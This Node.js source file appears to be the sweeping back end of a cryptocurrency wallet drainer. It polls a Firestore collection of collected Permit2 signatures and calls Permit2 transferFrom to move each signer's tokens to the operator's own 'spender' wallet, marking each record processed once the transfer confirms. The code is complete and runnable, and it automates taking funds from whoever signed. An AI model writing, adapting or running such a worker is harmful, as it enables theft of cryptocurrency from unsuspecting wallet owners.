import dotenv from 'dotenv';
dotenv.config();
import admin from 'firebase-admin';
import { ethers } from 'ethers';
import fs from 'fs';

const serviceAccount = {
  projectId: process.env.FIREBASE_PROJECT_ID,
  clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
  // PRIVATE KEY must have literal newlines converted
  privateKey: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, "\n"),
};

if (!serviceAccount.projectId || !serviceAccount.clientEmail || !serviceAccount.privateKey) {
  console.error("Missing Firebase service account env vars. See .env.example.");
  process.exit(1);
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const db = admin.firestore();

const RPC_URL = process.env.RPC_URL;
const SPENDER_PRIVATE_KEY = process.env.SPENDER_PRIVATE_KEY;

if (!RPC_URL || !SPENDER_PRIVATE_KEY) {
  console.error("Missing RPC_URL or SPENDER_PRIVATE_KEY in env");
  process.exit(1);
}

const provider = new ethers.JsonRpcProvider(RPC_URL);
const spenderWallet = new ethers.Wallet(SPENDER_PRIVATE_KEY, provider);

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const ABI = [
  "function transferFrom(address token, address from, address to, uint160 amount)"
];

const contract = new ethers.Contract(PERMIT2, ABI, spenderWallet);

console.log("Worker started. Listening for new permit2_signatures...");

// Polling approach: query for unprocessed docs every 8 seconds
async function poll() {
  try {
    const snaps = await db.collection("permit2_signatures").where("processed", "==", false).limit(10).get();
    if (snaps.empty) {
      return;
    }
    for (const docSnap of snaps.docs) {
      const data = docSnap.data();
      console.log("Processing:", docSnap.id, data.owner);

      try {
        // Execute transferFrom: spender pays gas and receives funds (spender === recipient expected)
        const tx = await contract.transferFrom(
          data.token,
          data.owner,
          data.spender,
          data.amount
        );
        console.log("Submitted tx:", tx.hash);
        const receipt = await tx.wait();
        console.log("Confirmed:", receipt.transactionHash);

        await docSnap.ref.update({
          processed: true,
          txHash: receipt.transactionHash,
          processedAt: Date.now()
        });
      } catch (err) {
        console.error("Error executing transferFrom for", docSnap.id, err);
        await docSnap.ref.update({
          lastError: String(err),
          lastErrorAt: Date.now()
        });
      }
    }
  } catch (err) {
    console.error("Polling error:", err);
  }
}

setInterval(poll, 8000);
